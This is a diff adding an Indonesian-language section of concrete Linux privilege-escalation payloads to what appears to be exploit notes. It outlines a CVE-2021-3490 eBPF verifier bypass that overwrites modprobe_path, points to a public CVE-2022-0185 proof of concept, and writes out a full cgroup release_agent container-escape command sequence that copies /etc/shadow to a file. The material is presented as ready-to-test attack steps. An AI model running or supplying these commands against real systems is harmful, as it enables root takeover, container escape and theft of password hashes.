@@ -90,3 +90,54 @@ Alternative — Kernel Exploit via eBPF:
 - CVE-2022-0185 — https://nvd.nist.gov/vuln/detail/CVE-2022-0185
 - eBPF Rootkit Research — https://www.ebpf.top/...
 - libbpf — https://libbpf.readthedocs.io/
+
+
+## Konkret — eBPF Exploit Payload (Testable)
+
+### Verifier Bypass — CVE-2021-3490 (Privesc)
+
+```c
+// eBPF verifier type confusion → arbitrary kernel read/write
+// Path: penggunaan ulang pointer map value setelah out-of-bounds add
+
+// Prasyarat: unprivileged BPF aktif (kernel.unprivileged_bpf_disabled=0)
+// Alur: verifier bypass → overwrite modprobe_path → root
+
+1. Load BPF map (array of 0x1000 elemen)
+2. Program:
+   - lookup elem → ptr value
+   - add offset besar (melewati bound) → ptr jadi out-of-bounds
+   - bpf_skb_load_bytes → tulis ke kernel memori
+3. Target: modprobe_path (0xffffffff81e3ea80, cari via /proc/kallsyms)
+4. Overwrite /sbin/modprobe → /tmp/x → trigger modprobe via file aneh
+5. /tmp/x = script yang tulis /root/root.txt
+```
+
+### CVE-2022-0185 — Heap Overflow (fs_context)
+
+```bash
+# unshare user namespace dulu (map uid/gid)
+unshare -Ur
+
+# Trigger legacy_parse_param overflow via filesystem context
+# PoC: https://github.com/Crusaders-of-Rust/CVE-2022-0185
+
+# Hasil: heap overflow pada legacy_parse_param
+# → corrupt msg_msg / pipe_buffer
+# → arbitrary free → RCE di context user namespace
+
+# Alternatif cepat privesc container:
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo \"$host_path/cmd\" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo 'cat /etc/shadow > /tmp/pwned' >> /cmd
+chmod +x /cmd
+sh -c 'echo \$\$ > /tmp/cgrp/x/cgroup.procs'
+```
+---
+
+audited
+---
